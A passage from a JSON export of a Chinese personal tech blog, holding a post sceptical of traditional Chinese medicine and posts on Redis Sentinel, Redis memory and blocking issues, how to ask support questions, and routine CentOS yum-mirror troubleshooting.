解一切毒：母猪屎，水和服之。 比如鼻血不止：血余，乱发烧灰吹之，立止，永不发。男用母发，女用父发。 蝙蝠屎可治眼疾。选自《本草纲目 兽部》 心痛不止：败笔头三个烧灰，无根水服，立效 小儿症瘕：老鼠肉煮汁，作粥食之 你看，李时珍的《本草纲目》放到今天里面充斥着这么多巫术一样的奇葩药方，我不是不信中草药能治病，你比如屠呦呦团队就发现了黄花蒿内的青蒿素能够治疗疟疾，这就是很有价值的事情，但是我相信屠呦呦并不是直接把黄花蒿拿来直接熬汤喝的吧，那样有效成分可能就完全没破坏了，他们也是利用乙醚提取了黄花蒿中的青蒿素而已，说到底还是利用现代医学的方法论而并不是中医的那套。 中药或中成药相比较西药研发成本都很低，有的中成药实际上就是中草药的另一种形式，比如做成丸或颗粒等。他并不像西药那样是提取物并且没有经过双盲测试和临床试验，所以对于那些副作用不明的药要慎用。 一个新药从研发到上市需要经过很多步骤： 一、 临床前试验将一个新发现的化合物经过实验室和动物试验，证明该化合物针对特定目标疾病具有生物活性，并且要评估该化合物的安全性。二新药临床研究申请当一个化合物通过了临床前试验后，需要向FDA提交新药临床研究申请，以便可以将该化合物应用于人体试验。如果在提交申请后30天内FDA没有驳回申请，那么该新药临床研究申请即被视为有效，可以进行人体试验。新药临床研究申请需要提供先前试验的材料；以及计划将在什么地方，由谁以及如何进行临床试验的说明；新化合物的结构；投药方式；动物试验中发现的所有毒性情况；该化合物的制造生产情况。所有临床方案必须经过机构审评委员会（Institutional Revuew Board，IRB）的审查和通过。每年必须向FDA和IRB 汇报一次临床试验的进程和结果。三、一期临床试验这一阶段的临床试验一般需要征集20－100名正常和健康的志愿者进行试验研究。试验的主要目的是提供该药物的安全性资料，包括该药物的安全剂量范围。同时也要通过这一阶段的临床试验获得其吸收、分布、代谢和排泄以及药效持续时间的数据和资料。四、二期临床试验这一期的临床试验通常需要征集100－500名相关病人进行试验。其主要目的是获得药物治疗有效性资料。五、三期临床试验这一期的临床试验通常需 1000－5000名临床和住院病人，多在多个医学中心进行，在医生的严格监控下，进一步获得该药物的有效性资料和鉴定副作用，以及与其他药物的相互作用关系。该阶段试验一般采取多中心，安慰剂（或/和有效对照剂）对照和双盲法试验。第三期临床试验是整个临床试验中最主要的一步。六、新药申请在完成所有三个阶段的临床试验并分析所有资料及数据，如证明该药物的安全性和有效性，则可以向 FDA提交新药申请。新药申请需要提供所有收集到的科学资料。通常一份新药申请材料可多达100000 页，甚至更多！按照法规，FDA应在6个月内审评完新药申请。但是由于大部分申请材料过多，而且有许多不规范，因此往往不能在这么短的时间内完成。 1999年对于单个化学分子药的审评时间平均为 12.6个月。七、批准上市一旦FDA批准新药申请后，该药物即可正式上市销售，供医生和病人选择。但是还必须定期向FDA呈交有关资料，包括该药物的副作用情况和质量管理记录。对于有些药物FDA还会要求做第四期临床试验，以观测其长期副作用情况。 所以我信现代医学，因为他有一套标准的研发流程和论证系统。就算是死也能让人死个明白，你可以对照中成药和西药的说明说，你就很容易发现中成药说明书字数很少，而且经常会写着尚不明确，而西药的说明书密密麻麻的写满了字，并说明了各种禁忌在什么样的条件下会发生什么样的副作用。而中草药则完全没有任何说明书。 而中医的基础都是些古代典籍，例如《黄帝内经》、《伤寒杂病论》等，几千年了，中医的理论典籍还是这些？晋唐宋明清也只是在这些理论上发展和继承，并没有突破。可这几千年，世界发生了多么翻天覆地的变化，尤其是科技和医疗，中医又不是宗教啊，就没怎么变过？ 比如马兜铃酸，马兜铃酸是一种有机酸类化合物，广泛存在于马兜铃属及细辛属等马兜铃科植物中。传统中医理论认为，马兜铃属的中草药具有利尿、抗感染、消炎和抗蛇毒等功效。包含马兜铃酸的中药材有广防己、青木香、天仙藤、马兜铃、寻骨风、朱砂莲、细辛和关木通等。含马兜铃酸的中草药和中成药曾用于治疗风湿、痛风、伤口化脓等多种病症，并广泛应用在减肥和减轻女性经期症状上。 但是现代医学发现马兜铃酸会损害肾脏。最初报道见诸１９６４年，因只是个例未引起医务界重视。上世纪９０年代，比利时研究发现，含有马兜铃酸的草药减肥药导致女性肾损害，被称为“中草药肾病”，引起世界关注。２００３年，中国多家媒体报道龙胆泻肝丸使用药材关木通所含马兜铃酸可导致肾病后，当年国家食品药品监督管理局发出通知，取消关木通的药用标准。 2017年10月中旬，美国《科学转化医学》杂志发表的一篇论文将马兜铃酸推上了舆论的风口浪尖，再次引发了人们对马兜铃酸是否致癌的激烈争论。最新研究又认为马兜铃酸可能导致肝癌。 在比如18年1月我咳嗽半个多月，一开始以为是小感冒，就去药店配了点急支糖浆和感冒清颗粒，结果一直吃不好，后来去医院抽个血发现支原体感染，医生给开了阿奇霉素，吃了3天就好了。你看，前者是中成药后者是西药。 中医动不动就讲全身调理，在我看来完全扯淡，局部都搞不定，还全身调理，所以，我的做法就是不信中医和中草药以及中成药。 你会发现近代以来一些重大疾病的攻克，完全没有中医的身影。而中医却一直活跃在各种传销以及假药活动中，比如权健、天狮、步长脑心通等保健品和中医药行业以及满屏的电视广告虚假宣传中医养生。到处收割智商税，所以怎么可能让人对他产生好感。 所以最好的办法就是不信任任何中医中药中成药、中药注射器和保健品。比如脑白金等，这些保健品其实也是收智商税，虽然相比较中医而言，他们打着科学的旗帜，比如这个维生素c片，人体每天都需要补充维生素c，如果维生素c缺乏就会得坏血病，但是，我们看下天猫的维生素c价格 几乎都是几十块钱起步，而实际上这些维生素c含片中的维生素含量很低，且富含各种糖啊乱七八糟的杂质，我吃的这种小白瓶1.1一瓶。每片净含量0.1g，也就是100mg，这其实也是一种变相的缴纳智商税。 最后要说一下，现在去医院看个病啊，真的是挂个号医生聊一下不到5分钟就完事了，医生也不会和你详细的说明每一个化验指标的含义，可能是久病成医吧！现在我都自己学习怎么看指标、以及管理自己的病。不断的学习中。 以上仅代表本人观点，反正我是不会选择不良反应尚不明确，禁忌尚不明确的中成药和中草药。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"redis哨兵","slug":"redis-哨兵","date":"2019-04-30T01:51:51.000Z","updated":"2021-02-26T06:05:29.289Z","comments":true,"path":"posts/10161.html","link":"","permalink":"https://awen.me/posts/10161.html","excerpt":"","text":"Redis Sentinel是Redis的高可用实现方案。 主从复制的问题主从复制也带来了以下问题: 主节点的写能力受到单机的限制 主节点的存储能力受到单机的限制。 当主节点出现故障时，Redis Sentinel能自动完成故障发现和故障转移，并通知应用方，从而实现真正的高可用。 Redis SentinelRedis Sentinel是一个分布式架构，其中包含若干个Sentinel节点和Redis数据节点，每个Sentinel节点会对数据节点和其余Sentinel节点进行监控，当它发现节点不可达时，会对节点做下线标识。如果被标识的是主节点，它还会和其他Sentinel节点进行“协商”，当大数Sentinel节点都认为主节点不可达时，它们会选举出一个Sentinel节点来完成自动故障转移的工作，同时会将这个变化实时通知给Redis应用方。整个过程完全是自动的，不需要人工来介入，所以这套方案很有效地解决了Redis的高可用问题。 Redis Sentinel具有以下几个功能: 监控 通知 主节点故障转移 配置提供者 同时看到，Redis Sentinel包含了若个Sentinel节点，这样做也带来了两个好处： 对于节点的故障判断是由多个Sentinel节点共同完成，这样可以有效地防止误判。 Sentinel节点集合是由若干个Sentinel节点组成的，这样即使个别Sentinel节点不可用，整个Sentinel节点集合依然是健壮的。 但是Sentinel节点本身就是独立的Redis节点，只不过它们有一些特殊，它们不存储数据，只支持部分命令。","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"提问的智慧","slug":"提问的智慧","date":"2019-04-29T11:38:45.000Z","updated":"2021-02-26T06:05:29.340Z","comments":true,"path":"posts/34680.html","link":"","permalink":"https://awen.me/posts/34680.html","excerpt":"","text":"作为一名接客没有上万也有上千的 IT 售后技术支持人员，回顾我这些年接的客，我发现很大一部分人在提出他们的问题时都让人无语。 很多人根本就不会有效的反馈他们遇到的问题，当提出一个问题时，要么表达的有问题，要么信息给的不全面导致要进行大量的反复的沟通确认，要么就是反馈问题前自己都没有做任何排查，从而降低处理和解决问题的效率。有时候一个非常简单的问题，但是因为用户反馈的信息不全面导致要反复来回沟通，浪费彼此的时间。 比如，下面这个问题： 1我的服务器无法连接了，麻烦帮我看下。 这个问题让人脑瓜疼的要命，首先是哪台服务器，无法连接是什么端口无法连接？没有任何有效信息，于是就需要工单中进行来回的反复确认，如果他这样描述下，可能2分钟就可以帮助他解决问题： 1我的服务器IP地址是 59.112.22.34，Windows的远程端口 3389 无法连接了，麻烦帮我看下是什么原因导致的，刚才连接还好好的。 这段话和之前的比较，里面包含了 IP 地址和有效的端口号，并且用户告知了他刚才连接还是OK的，说明此前是没有问题，那么现在出现问题，可以通过telnet [IP] [port] 确认他的端口是否正常打开，如果不能打开，确认下他是否修改了端口或禁止了端口以及远程。 在比如这个问题: 1One of the configured repositories failed (CentOS-7 - Base - 163.com), and yum doesn&#39;t have enough cached data to continue. At this point the only safe thing yum can do is fail. There are a few ways to work &quot;fix&quot; this: 1. Contact the upstream for the repository and get them to fix the problem. 2. Reconfigure the baseurl&#x2F;etc. for the repository, to point to a working upstream. This is most often useful if you are using a newer distribution release than is supported by the repository (and the packages for the previous distribution release still work). 3. Disable the repository, so yum won&#39;t use it by default. Yum will then just ignore the repository until you permanently enable it again or use --enablerepo for temporary usage: yum-config-manager --disable base 直接丢了一段系统返回的错误信息，然后就没有任何有效信息了，这种问题，自己拿着报错信息去谷歌百度一番，答案立马就出来了。根本用不着提问，这就是个垃圾问题。 如果他把这个问题改下： 1234567891011服务器IP 59.112.43.32DNS 服务器： 114.114.114.114执行 yum install gcc 报错报错信息：One of the configured repositories failed (CentOS-7 - Base - 163.com), and yum doesn&#39;t have enough cached data to continue. At this point the only safe thing yum can do is fail. There are a few ways to work &quot;fix&quot; this: 1. Contact the upstream for the repository and get them to fix the problem. 2. Reconfigure the baseurl&#x2F;etc. for the repository, to point to a working upstream. This is most often useful if you are using a newer distribution release than is supported by the repository (and the packages for the previous distribution release still work). 3. Disable the repository, so yum won&#39;t use it by default. Yum will then just ignore the repository until you permanently enable it again or use --enablerepo for temporary usage: yum-config-manager --disable base我的yum 配置是 xxxx下面是我ping 163.com 的返回信息：PING mirrors.163.com (59.111.0.251): 56 data bytes64 bytes from 59.111.0.251: icmp_seq&#x3D;0 ttl&#x3D;55 time&#x3D;1.910 ms64 bytes from 59.111.0.251: icmp_seq&#x3D;1 ttl&#x3D;55 time&#x3D;3.846 ms64 bytes from 59.111.0.251: icmp_seq&#x3D;2 ttl&#x3D;55 time&#x3D;1.926 ms 可能就只需要2分钟就搞定了，直接替换yum源，然后清空 yum 缓存重新 makecache就可以了。 Github 有个项目叫提问题的智慧，推荐每一个要向别人提问题的人好好看一看。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"理解redis的内存","slug":"理解redis-的内存","date":"2019-04-29T09:22:17.000Z","updated":"2021-02-26T06:05:29.347Z","comments":true,"path":"posts/7907.html","link":"","permalink":"https://awen.me/posts/7907.html","excerpt":"","text":"内存消耗内存消耗统计执行 info memory 获取相关指标 当mem_fragmentation_ratio&gt;1时，说明used_memory_rss-used_memory多出的部分内存并没有用于数据存储，而是被内存碎片所消耗，如果两者相差很大，说明碎片率严重。 当mem_fragmentation_ratio&lt;1时，这种情况一般出现在操作系统把Redis内存交换（Swap）到硬盘导致，出现这种情况时要格外关注，由于硬盘速度远远慢于内存，Redis性能会变得很差，甚至僵死。 内存消耗划分Redis进程内消耗主要包括：自身内存+对象内存+缓冲内存+内存碎片，其中Redis空进程自身内存消耗非常少，通常used_memory_rss在3MB左右，used_memory在800KB左右，一个空的Redis进程消耗内存可以忽略不计。 对象内存对象内存是Redis内存占用最大的一块，存储着用户所有的数据。 缓存内存缓冲内存主要包括：客户端缓冲、复制积压缓冲区、AOF缓冲区。 客户端缓冲，是所有接入到Redis服务器TCP连接的输入输出缓冲，最大1G，超过将断开连接，通过数client-output-buffer-limit 控制 普通客户端，除了复制和订阅的客户端之外的所有连接，Redis的默认配置是：client-output-buffer-limit normal000Redis，并没有对普通客户端的输出缓冲区做限制，一般普通客户端的内存消耗可以忽略不计，但是当有大量慢连接客户端接入时这部分内存消耗就不能忽略了，可以设置maxclients做限制。 从客户端，主节点会为每个从节点单独建立一条连接用于命令复制，默认配置是：client-output-buffer-limit slave256mb64mb60。 复制积压缓存区，默认1M，对于复制积压缓冲区整个主节点只有一个，所有的从节点共享此缓冲区，因此可以设置较大的缓冲区空间，如100MB，这部分内存投入是有价值的，可以有效避免全量复制。 AOF 缓存区，这部分空间用于在Redis重写期间保存最近的写入命令，AOF缓冲区空间消耗用户无法控制，消耗的内存取决于AOF重写时间和写入命令量，这部分空间占用通常很小。 内存碎片Redis默认的内存分配器采用jemalloc，可选的分配器还有：glibc、tcmalloc。内存分配器为了更好地管理和重复利用内存，分配内存策略一般采用固定范围的内存块进行分配。例如jemalloc在64位系统中将内存空间划分为：小、大、巨大三个范围。每个范围内又划分为多个小的内存块单位。 比如当保存5KB对象时jemalloc可能会采用8KB的块存储，而剩下的3KB空间变为了内存碎片不能再分配给其他对象存储。内存碎片问题虽然是所有内存服务的通病，但是jemalloc针对碎片化问题专门做了优化，一般不会存在过度碎片化的问题，正常的碎片率（mem_fragmentation_ratio）在1.03左右。但是当存储的数据长短差异较大时，会出现碎片问题： 频繁做更新操作 大量过期键删除 解决方案： 数据对其，在条件允许的情况下尽量做数据对齐，比如数据尽量采用数字类型或者固定长度字符串等。 安全重启， 可以利用高可用架构，如Sentinel或Cluster，将碎片率过高的主节点转换为从节点，进行安全重启) 子进程内存消耗子进程内存消耗主要指执行AOF/RDB重写时Redis创建的子进程内存消耗。Redis执行fork操作产生的子进程内存占用量对外表现为与父进程相同，理论上需要一倍的物理内存来完成重写操作。但Linux具有写时复制技术（copy-on-write），父子进程会共享相同的物理内存页，当父进程处理写请求时会对需要修改的页复制出一份副本完成写操作，而子进程依然读取fork时整个父进程的内存快照。 Linux Kernel在2.6.38内核增加了Transparent Huge Pages（THP）机制，而有些Linux发行版即使内核达不到2.6.38也会默认加入并开启这个功能，如Redhat Enterprise Linux在6.0以上版本默认会引入THP。虽然开启THP可以降低fork子进程的速度，但之后copy-on-write期间复制内存页的单位从4KB变为2MB，如果父进程有大量写命令，会加重内存拷贝量，从而造成过度内存消耗。 1234&#x2F;&#x2F; 开启THP:C * AOF rewrite: 1039 MB of memory used by copy-on-write&#x2F;&#x2F; 关闭THP:C * AOF rewrite: 9 MB of memory used by copy-on-wri 这两个日志出自同一Redis进程，used_memory总量为1.5GB，子进程执行期间每秒写命令量都在200左右。当分别开启和关闭THP时，子进程内存消耗有天壤之别。如果在高并发写的场景下开启THP，子进程内存消耗可能是父进程的数倍，极易造成机器物理内存溢出，从而触发SWAP或OOMkiller 子进程内存消耗总结如下 Redis产生的子进程并不需要消耗1倍的父进程内存，实际消耗根据期间写入命令量决定，但是依然要预留出一些内存防止溢出。 需要设置sysctl vm.overcommit_memory=1允许内核可以分配所有的物理内存，防止Redis进程执行fork时因系统剩余内存不足而失败。 排查当前系统是否支持并开启THP，如果开启建议关闭，防止copy-onwrite期间内存过度消 内存管理设置内存上限用maxmemory参数限制最大可用内存,当缓存场景，内存超过该值时，使用LRU等删除释放空间。 maxmemory限制的是Redis实际使用的内存量，也就是used_memory统计项对应的内存。由于内存碎片率的存在，实际消耗的内存可能会比maxmemory设置的更大，实际使用时要小心这部分内存溢出。 比如一台24GB内存的服务器，为系统预留4GB内存，预留4GB空闲内存给其他进程或Redis fork进程，留给Redis16GB内存，这样可以部署4个maxmemory=4GB的Redis进程。得益于Redis单线程架构和内存限制机制，即使没有采用虚拟化，不同的Redis进程之间也可以很好地实现CPU和内存的隔离性。 Redis默认无限使用服务器内存，为防止极端情况下导致系统内存耗尽，建议所有的Redis进程都要配置maxmemory。在保证物理内存可用的情况下，系统中所有Redis实例可以调整maxmemory参数来达到自由伸缩内存的目 内存回收策略删除过期键对象 惰性删除，惰性删除用于当客户端读取带有超时属性的键时，如果已经超过键设置的过期时间，会执行删除操作并返回空，这种策略是出于节省CPU成本考虑，不需要单独维护TTL链表来处理过期键的删除。但是单独用这种方式存在内存泄露的问题，当过期键一直没有访问将无法得到及时删除，从而导致内存不能及时释放。正因为如此，Redis还提供另一种定时任务删除机制作为惰性删除的补充。 定时任务删除，Redis内部维护一个定时任务，默认每秒运行10次（通过配置hz控制）。定时任务中删除过期键逻辑采用了自适应算法，根据键的过期比例、使用快慢两种速率模式回收键。 流程说明： 1）定时任务在每个数据库空间随机检查20个键，当发现过期时删除对应的键。 2）如果超过检查数25%的键过期，循环执行回收逻辑直到不足25%或运行超时为止，慢模式下超时时间为25毫秒。 3）如果之前回收键逻辑超时，则在Redis触发内部事件之前再次以快模式运行回收过期键任务，快模式下超时时间为1毫秒且2秒内只能运行1次。 4）快慢两种模式内部删除逻辑相同，只是执行的超时时间不同。 内存溢出控制 当Redis所用内存达到maxmemory上限时会触发相应的溢出控制策略。具体策略受maxmemory-policy参数控制，Redis支持6种策略，如下所示： 1）noeviction：默认策略，不会删除任何数据，拒绝所有写入操作并返回客户端错误信息（error）OOM command not allowed when used memory，此时Redis只响应读操作。 2）volatile-lru：根据LRU算法删除设置了超时属性（expire）的键，直到腾出足够空间为止。如果没有可删除的键对象，回退到noeviction策略。 3）allkeys-lru：根据LRU算法删除键，不管数据有没有设置超时属性，直到腾出足够空间为止。 4）allkeys-random：随机删除所有键，直到腾出足够空间为止。 5）volatile-random：随机删除过期键，直到腾出足够空间为止。 6）volatile-ttl：根据键值对象的ttl属性，删除最近将要过期数据。如果没有，回退到noeviction策 内存溢出控制策略可以采用config set maxmemory-policy{policy}动态配置。 内存优化redisObject对象Redis存储的所有值对象在内部定义为redisObject结构体。 Redis存储的数据都使用redisObject来封装，包括string、hash、list、set、zset在内的所有数据类型。 type字段：表示当前对象使用的数据类型。 encoding字段：表示Redis内部编码类型。 lru字段：记录对象最后一次被访问的时间 可以使用scan+object idletime命令批量查询哪些键长时间未被访问，找出长时间不访问的键进行清理，可降低内存占用 refcount字段：记录当前对象被引用的次数，用于通过引用次数回收内存，当refcount=0时，可以安全回收当前对象空间。使用object refcount{key}获取当前对象引用。当对象为整数且范围在[0-9999]时，Redis可以使用共享对象的方式来节省内存。 *ptr字段：与对象的数据内容相关，如果是整数，直接存储数据；否则表示指向数据的指针。Redis在3.0之后对值对象是字符串且长度&lt;=39字节的数据，内部编码为embstr类型，字符串sds和redisObject一起分配，从而只要一次内存操作即可。 高并发写入场景中，在条件允许的情况下，建议字符串长度控制在39字节以内，减少创建redisObject内存分配次数，从而提高性性能。 缩减键值对象降低Redis内存使用最直接的方式就是缩减键（key）和值（value）的长度。 key，在设计键时，越短越好。 value ，去掉不必要的熟悉，避免存储无效数据。其次在序列化工具选择上，应该选择更高效的序列化工具来降低字节数组大小。 共享对象池共享对象池是指Redis内部维护[0-9999]的整数对象池。创建大量的整数类型redisObject存在内存开销，每个redisObject内部结构至少占16字节，甚至超过了整数自身空间消耗。所以Redis内存维护一个[0-9999]的整数对象池，用于节约内存。除了整数值对象，其他类型如list、hash、set、zset内部元素也可以使用整数对象池。因此开发中在满足需求的前提下，尽量使用整数对象以节省内存。 整数对象池在Redis中通过变量REDIS_SHARED_INTEGERS定义，不能通过配置修改。可以通过object refcount命令查看对象引用数验证是否启用整数对象池技术。 字符串优化字符串结构Redis自身实现的字符串结构有如下特点： O（1）时间复杂度获取：字符串长度、已用长度、未用长度。 可用于保存字节数组，支持安全的二进制数据存储。 内部实现空间预分配机制，降低内存再分配次数。 惰性删除机制，字符串缩减后的空间不释放，作为预分配空间保留 预分配机制因为字符串（SDS）存在预分配机制，日常开发中要小心预分配带来的内存浪费。 字符串预分配每次并不都是翻倍扩容，空间预分配规则如下： 第一次创建len属性等于数据实际大小，free等于0，不做预分配。 修改后如果已有free空间不够且数据小于1M，每次预分配一倍容量。如原有len=60byte，free=0，再追加60byte，预分配120byte，总占用空间：60byte+60byte+120byte+1byte。 修改后如果已有free空间不够且数据大于1MB，每次预分配1MB数据。如原有len=30MB，free=0，当再追加100byte，预分配1MB，总占用空间：1MB+100byte+1MB+1byte。 尽量减少字符串频繁修改操作如append、setrange，改为直接使用set修改字符串，降低预分配带来的内存浪费和内存碎片化。 字符串重构字符串重构：指不一定把每份数据作为字符串整体存储，像json这样的数据可以使用hash结构，使用二级结构存储也能帮我们节省内存。同时可以使用hmget、hmset命令支持字段的部分读取修改，而不用每次整体存取。 根据测试结构，第一次默认配置下使用hash类型，内存消耗不但没有降低反而比字符串存储多出2倍，而调整hash-max-ziplist-value=66之后内存降低为535.60M。因为json的videoAlbumPic属性长度是65，而hash-max-ziplist value默认值是64，Redis采用hashtable编码方式，反而消耗了大量内存。调整配置后hash类型内部编码方式变为ziplist，相比字符串更省内存且支持属性的部分操作。 编码优化Redis对外提供了string、list、hash、set、zet等类型，但是Redis内部针对不同类型存在编码的概念，所谓编码就是具体使用哪种底层数据结构来实现。编码不同将直接影响数据的内存占用和读写效率。使用objectencoding{key}命令获取编码类型。 ziplist编码主要目的是为了节约内存，因此所有数据都是采用线性连续的内存结构。ziplist编码是应用范围最广的一种，可以分别作为hash、list、zset类型的底层数据结构实现。首先从ziplist编码结构开始分析，它的内部结构类似这样：&lt;zlbytes&gt;&lt;zltail&gt;&lt;zllen&gt;&lt;entry-1&gt;&lt;entry-2&gt;&lt;....&gt;&lt;entry-n&gt;&lt;zlend&gt;。一个ziplist可以包含多个entry（元素），每个entry保存具体的数据（整数或者字节数组） ziplist结构字段含义： zlbytes：记录整个压缩列表所占字节长度，方便重新调整ziplist空间。类型是int-32，长度为4字节。 zltail：记录距离尾节点的偏移量，方便尾节点弹出操作。类型是int-32，长度为4字节。 zllen：记录压缩链表节点数量，当长度超过216-2时需要遍历整个列表获取长度，一般很少见。类型是int-16，长度为2字节。 entry：记录具体的节点，长度根据实际存储的数据而定。 prev_entry_bytes_length：记录前一个节点所占空间，用于快速定位上一个节点，可实现列表反向迭代。 encoding：标示当前节点编码和长度，前两位表示编码类型：字符串/整数，其余位表示数据长度。 contents：保存节点的值，针对实际数据长度做内存占用优化。 zlend：记录列表结尾，占用一个字节。 根据以上对ziplist字段说明，可以分析出该数据结构特点如下： 内部表现为数据紧凑排列的一块连续内存数组。 可以模拟双向链表结构，以O（1）时间复杂度入队和出队。 新增删除操作涉及内存重新分配或释放，加大了操作的复杂性。 读写操作涉及复杂的指针移动，最坏时间复杂度为O（n2）。 适合存储小对象和长度有限的数。 测试数据采用100W个36字节数据，划分为为1000。从测试结果可以看出 使用ziplist可以分别作为hash、list、zset数据类型实现。 使用ziplist编码类型可以大幅降低内存占用。 ziplist实现的数据类型相比原生结构，命令操作更加耗时，不同类型耗时排序：list&lt;hash&lt;zset。 针对性能要求较高的场景使用ziplist，建议长度不要超过1000，每个元素大小控制在512字节以内。 intset编码是集合（set）类型编码的一种，内部表现为存储有序、不重复的整数集。当集合只包含整数且长度不超过set-max-intset-entries配置时被启用。执行以下命令查看intset表现。 intset的字段结构含义： 1）encoding：整数表示类型，根据集合内最长整数值确定类型，整数类型划分为三种：int-16、int-32、int-64。2）length：表示集合元素个数。 3）contents：整数数组，按从小到大顺序保存 intset保存的整数类型根据长度划分，当保存的整数超出当前类型时，将会触发自动升级操作且升级后不再做回退。升级操作将会导致重新申请内存空间，把原有数据按转换类型后拷贝到新数组。 使用intset编码的集合时，尽量保持整数范围一致，如都在int-16范围内。防止个别大整数触发集合升级操作，产生内存浪费。 控制键的数量当使用Redis存储大量数据时，通常会存在大量键，过多的键同样会消耗大量内存。Redis本质是一个数据结构服务器，它为我们提供多种数据结构，如hash、list、set、zset等。使用Redis时不要进入一个误区，大量使用get/set这样的API，把Redis当成Memcached使用。对于存储相同的数据内容利用Redis的数据结构降低外层键的数量，也可以节省大量内存。","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"如何解决redis 的阻塞问题","slug":"如何解决redis-的阻塞问题","date":"2019-04-29T08:42:53.000Z","updated":"2021-02-26T06:05:29.330Z","comments":true,"path":"posts/63813.html","link":"","permalink":"https://awen.me/posts/63813.html","excerpt":"","text":"当 redis 阻塞时，应用会收到大量的redis 超时异常，应当将这些异常加入统计并通过邮件等方式报警。 日常监控命令的耗时、慢查询、持久化阻塞、连接拒绝、CPU\\磁盘\\IO网络负载等等。 内在原因 API 或数据结构不合理 CPU 饱和问题 持久化相关的阻塞 API 数据结构不合理如对一个包含上万个元素的hash结构执行hgetall操作。 发现慢查询 slowlog get [n] 获取最近n条查询慢的命令。 修改低算法的命令，例如替换hgetall 为hmget，禁止 keys、sort 等。 调整大对象，防止一次操作过多数据。 redis-cli bigkeys，其原理是采用分段scan 操作。把历史扫描过的最大对象统计出来进行分析优化。 CPU 饱和redis-cli –stat 获取redis 的使用情况。 持久化阻塞fork阻塞 fork操作发生在RDB和AOF重写时，Redis主线程调用fork操作产生共享内存的子进程，由子进程完成持久化文件重写工作。如果fork操作本身耗时过长，必然会导致主线程的阻塞可以执行info stats命令获取到latest_fork_usec指标，表示Redis最近一次fork操作耗时，如果耗时很大，比如超过1秒，则需要做出优化调整，如避免使用过大的内存实例和规避fork缓慢的操作系统等aof 刷盘阻塞 当我们开启AOF持久化功能时，文件刷盘的方式一般采用每秒一次，后台线程每秒对AOF文件做fsync操作。当硬盘压力过大时，fsync操作需要等待，直到写入完成。如果主线程发现距离上一次的fsync成功超过2秒，为了数据安全性它会阻塞直到后台线程执行fsync操作完成。这种阻塞行为主要是硬盘压力引起。 外在原因CPU 竞争 进程竞争，可以通过top、sar等命令定位到CPU消耗的时间点和具体进程 绑定CPU，部署Redis时为了充分利用多核CPU，通常一台机器部署多个实例。常见的一种优化是把Redis进程绑定到CPU上，用于降低CPU频繁上下文切换的开销。 内存交换， 保障内存充足 确保所有Redis实例设置最大可用内存（maxmemory），防止极端情况下Redis内存不可控的增长。 降低系统使用swap优先级，如echo10&gt;/proc/sys/vm/swappiness 网络问题 连接被拒绝 网络闪断，通过sar-n DEV查看本机历史流量是否正常，或者借助外部系统监控工具（如Ganglia）进行识别 redis连接拒绝，maxclients参数现在默认1000，客户端访问Redis时尽量采用NIO长连接或者连接池的方式。 连接溢出，检查进程限制，例如过ulimit、以及backlog队列Redis默认的长度为511，通过tcp-backlog参数设置。 网络延迟，取决于网络环境。 参考资料 https://redis.io/topics/latency","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"云计算正在加速淘汰那些低端运维","slug":"云计算正在加速淘汰那些低端运维","date":"2019-04-26T21:56:45.000Z","updated":"2021-02-26T06:05:29.298Z","comments":true,"path":"posts/38007.html","link":"","permalink":"https://awen.me/posts/38007.html","excerpt":"","text":"我从事云计算行业也有些年头了，之前做 CDN 后来做公有云和私有云以及容器云的技术支持工作，在工作中我遇到形形色色的客户，这些客户大都来自传统行业，例如快递、工业以及一些中小型创业公司，当然还有一些互联网行业的从业者，和这些用户接触后，我发现他们的运维水平都相当的低。一些简单的系统故障都没有能力解决或者是即使有能力也懒得去自己解决，完全依赖云厂商。 打个比方,一个客户(这个用户是一家互联网企业，具体身份暂且不表，如果暴露出来我怕影响这家单位的名声)，在使用yum 安装 gcc 时出现了如下报错： 1234One of the configured repositories failed (CentOS-7 - Base - 163.com), and yum doesn&#39;t have enough cached data to continue. At this point the only safe thing yum can do is fail. There are a few ways to work &quot;fix&quot; this: 1. Contact the upstream for the repository and get them to fix the problem.2. Reconfigure the baseurl&#x2F;etc. for the repository, to point to a working upstream. This is most often useful if you are using a newer distribution release than is supported by the repository (and the packages for the previous distribution release still work). 3. Disable the repository, so yum won&#39;t use it by default. Yum will then just ignore the repository until you permanently enable it again or use --enablerepo for temporary usage: yum-config-manager --disable base 老实讲，我觉得他问这种问题真的让我怀疑他的老板是如何把他招聘进来的。这种问题的报错信息和修复方案操作系统已经明明白白清清楚楚的表达了，就算你英文差劲到完全看不懂，你也可以做如下操作来迅速的查找解决方案： 第一复制报错信息去找翻译软件翻译看看到底说的啥，虽然现在的翻译软件不能完全翻译准确，但是大概意思应该还是可以看清楚的。 第二，直接把内容复制粘贴到搜索引擎去搜索，这一条的解决方案是最快速的。 不过既然他已经找到我们了，我也给他提供了修复方案，让他更换yum 源，但是这家伙又给我贴了一段报错 1http:&#x2F;&#x2F;mirrors.163.com&#x2F;centos&#x2F;7&#x2F;os&#x2F;x86_64&#x2F;repodata&#x2F;repomd.xml: [Errno -1] Error importing repomd.xml for base: Damaged repomd.xml file Trying other mirror. 然后因为这个问题，他折腾了三个多小时，最后我不得不一步一步的写下解决方案 123456789# echo &quot;nameserver 114.114.114.114&quot; &gt;&gt; &#x2F;etc&#x2F;resolv.conf# cd &#x2F;etc&#x2F;yum.repos.d# curl -o &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;Centos-7.repo# yum clean all# yum makecache 我姑且把这类用户算成小白用户吧，因为很明显他对于 Linux 完全不懂，这种问题并不是需要多少技术含量才可以解决的，应该属于 Linux 最基础最基础的知识了。如果他是科班出身，我绝对会鄙视他不学无术，如果他不是科班，这老板是怎么把他招聘进来做服务器管理工作的，让这种人来运维操作服务器，这业务稳定性让人着实担心，后面指不定还会遇到例如服务器黑入侵、误删文件等等一系列因为他的水平不足导致的各种运维故障，然而我想他到时候肯定会把锅甩给云厂商。 